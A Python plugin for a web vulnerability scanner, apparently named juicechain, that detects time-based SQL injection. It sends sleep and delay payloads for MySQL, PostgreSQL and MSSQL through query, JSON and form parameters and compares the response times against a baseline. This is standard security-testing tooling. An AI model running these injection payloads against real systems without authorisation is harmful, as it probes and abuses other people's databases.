from __future__ import annotations

import secrets
import time
from typing import Any, ClassVar

from juicechain.core.http_client import HttpClient, HttpResponse
from juicechain.core.input_point import InputPoint
from juicechain.core.target import join_url
from juicechain.plugins.base import Finding, VulnPlugin
from juicechain.utils.logging import get_logger

logger = get_logger(__name__)

_STATIC_SUFFIXES: tuple[str, ...] = (
    ".js",
    ".css",
    ".png",
    ".jpg",
    ".jpeg",
    ".gif",
    ".svg",
    ".ico",
    ".woff",
    ".woff2",
    ".map",
)

_PAYLOADS: tuple[str, ...] = (
    "' AND SLEEP(5)-- ",
    "' AND pg_sleep(5)-- ",
    "'; WAITFOR DELAY '0:0:5'-- ",
)


class Plugin(VulnPlugin):
    name: ClassVar[str] = "SQLI_TIME"
    severity: ClassVar[str] = "high"

    def _is_static_path(self, path: str) -> bool:
        normalized = (path or "").strip().lower().split("?", 1)[0]
        return any(normalized.endswith(suffix) for suffix in _STATIC_SUFFIXES)

    def _request_with_value(
        self,
        *,
        base: str,
        point: InputPoint,
        client: HttpClient,
        timeout: float,
        max_bytes: int,
        value: str,
    ) -> tuple[HttpResponse, int]:
        url = join_url(base, point.path)
        start = time.monotonic()

        if point.location == "query":
            res = client.request(
                point.method,
                url,
                timeout=timeout,
                max_bytes=max_bytes,
                params={point.param: value},
                headers=point.extra_headers,
            )
        elif point.location == "body_json":
            body: dict[str, Any] = {point.param: value}
            headers = {"Content-Type": "application/json", **point.extra_headers}
            res = client.request(
                point.method,
                url,
                timeout=timeout,
                max_bytes=max_bytes,
                headers=headers,
                json_data=body,
            )
        elif point.location == "body_form":
            data: dict[str, Any] = {point.param: value}
            headers = {"Content-Type": "application/x-www-form-urlencoded", **point.extra_headers}
            res = client.request(
                point.method,
                url,
                timeout=timeout,
                max_bytes=max_bytes,
                headers=headers,
                data=data,
            )
        else:
            res = client.request(
                point.method,
                url,
                timeout=timeout,
                max_bytes=max_bytes,
                headers=point.extra_headers,
            )

        elapsed_ms = int(round((time.monotonic() - start) * 1000.0))
        return res, elapsed_ms

    def check(
        self,
        base: str,
        point: InputPoint,
        client: HttpClient,
        timeout: float,
        max_bytes: int,
    ) -> Finding | None:
        if self._is_static_path(point.path):
            return None

        baseline_samples: list[int] = []
        for _ in range(3):
            baseline_value = f"jc_time_{secrets.token_hex(4)}"
            baseline_res, baseline_elapsed_ms = self._request_with_value(
                base=base,
                point=point,
                client=client,
                timeout=timeout,
                max_bytes=max_bytes,
                value=baseline_value,
            )
            if not baseline_res.ok:
                return None
            baseline_samples.append(baseline_elapsed_ms)

        baseline_avg_ms = sum(baseline_samples) / float(len(baseline_samples))

        for payload in _PAYLOADS:
            res, elapsed_ms = self._request_with_value(
                base=base,
                point=point,
                client=client,
                timeout=12.0,
                max_bytes=max_bytes,
                value=payload,
            )
            if not res.ok:
                continue
            if elapsed_ms <= baseline_avg_ms + 4000.0:
                continue

            url = join_url(base, point.path)
            evidence = (
                f"response delay detected: baseline_avg_ms={int(round(baseline_avg_ms))}, "
                f"injected_ms={elapsed_ms}, threshold={int(round(baseline_avg_ms + 4000.0))}"
            )
            logger.info("potential time-based SQLi finding: path=%s param=%s", point.path, point.param)
            return Finding(
                vuln_type=self.name,
                severity=self.severity,
                evidence=evidence,
                request={
                    "method": point.method,
                    "url": url,
                    "location": point.location,
                    "param": point.param,
                    "payload": payload,
                },
                response={
                    "status_code": res.status_code,
                    "content_type": res.content_type(),
                    "time_ms": elapsed_ms,
                },
            )

        return None
